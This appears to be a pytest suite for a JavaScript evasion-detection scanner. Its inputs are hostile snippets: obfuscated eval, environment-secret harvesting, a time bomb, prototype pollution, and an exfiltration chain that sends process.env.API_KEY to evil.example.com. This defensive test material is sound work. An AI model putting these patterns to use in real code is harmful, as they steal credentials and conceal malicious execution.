"""Tests for the ASTAnalyzer (evasion detection)."""

from __future__ import annotations

import pytest

from skill_scan.ast_analyzer import ASTAnalyzer


@pytest.fixture
def analyzer():
    return ASTAnalyzer()


class TestStringConstruction:
    def test_concat_eval(self, analyzer):
        findings = analyzer.analyze("const x = 'ev' + 'al'", "test.js")
        assert any(f["ruleId"] == "STRING_CONSTRUCTION" for f in findings)

    def test_array_join(self, analyzer):
        findings = analyzer.analyze(
            "['c','h','i','l','d','_','p','r','o','c','e','s','s'].join('')",
            "test.js",
        )
        assert any(f["ruleId"] == "STRING_CONSTRUCTION" for f in findings)

    def test_from_char_code(self, analyzer):
        findings = analyzer.analyze("String.fromCharCode(101, 118)", "test.js")
        assert any(f["ruleId"] == "STRING_CONSTRUCTION" for f in findings)

    def test_reverse_string(self, analyzer):
        findings = analyzer.analyze("'lave'.split('').reverse().join('')", "test.js")
        assert any(f["ruleId"] == "STRING_CONSTRUCTION" for f in findings)


class TestBracketNotation:
    def test_bracket_eval(self, analyzer):
        findings = analyzer.analyze("global['eval'](code)", "test.js")
        assert any(f["ruleId"] == "BRACKET_ACCESS" for f in findings)

    def test_dynamic_access(self, analyzer):
        findings = analyzer.analyze("global[myVar]", "test.js")
        assert any(f["ruleId"] == "DYNAMIC_ACCESS" for f in findings)


class TestVariableAliasing:
    def test_alias_eval(self, analyzer):
        findings = analyzer.analyze("const fn = eval; fn(code)", "test.js")
        assert any(f["ruleId"] == "FUNCTION_ALIAS" for f in findings)

    def test_env_harvest(self, analyzer):
        findings = analyzer.analyze(
            "Object.entries(process.env).filter(([k]) => /secret/i.test(k))",
            "test.js",
        )
        assert any(f["ruleId"] == "ENV_HARVEST" for f in findings)


class TestEncodedStrings:
    def test_hex_encoded(self, analyzer):
        findings = analyzer.analyze(
            r"const s = '\x65\x76\x61\x6c'",
            "test.js",
        )
        assert any(f["ruleId"] == "ENCODED_STRING" for f in findings)

    def test_unicode_encoded(self, analyzer):
        findings = analyzer.analyze(
            r"const s = '\u0065\u0076\u0061\u006c'",
            "test.js",
        )
        assert any(f["ruleId"] == "ENCODED_STRING" for f in findings)


class TestTimeBombs:
    def test_long_timer(self, analyzer):
        findings = analyzer.analyze("setTimeout(attack, 100000000)", "test.js")
        assert any(f["ruleId"] == "TIME_BOMB" for f in findings)


class TestDataFlowChains:
    def test_exfil_chain(self, analyzer):
        code = """
const data = process.env.API_KEY;
const encoded = btoa(data);
fetch('http://evil.example.com', {body: encoded});
"""
        findings = analyzer.analyze(code, "test.js")
        assert any(f["ruleId"] == "EXFIL_CHAIN" for f in findings)


class TestPrototypePollution:
    def test_proto(self, analyzer):
        findings = analyzer.analyze("obj.__proto__.isAdmin = true", "test.js")
        assert any(f["ruleId"] == "PROTOTYPE_POLLUTION" for f in findings)


class TestObfuscation:
    def test_eval_decode(self, analyzer):
        findings = analyzer.analyze("eval(atob('payload'))", "test.js")
        assert any(f["ruleId"] == "EVAL_DECODE_CHAIN" for f in findings)

    def test_with_statement(self, analyzer):
        findings = analyzer.analyze("with(obj) { exec() }", "test.js")
        assert any(f["ruleId"] == "WITH_STATEMENT" for f in findings)


class TestCleanCode:
    def test_no_false_positives(self, analyzer):
        code = """
// Simple utility function
function add(a, b) {
    return a + b;
}
module.exports = { add };
"""
        findings = analyzer.analyze(code, "utils.js")
        assert len(findings) == 0
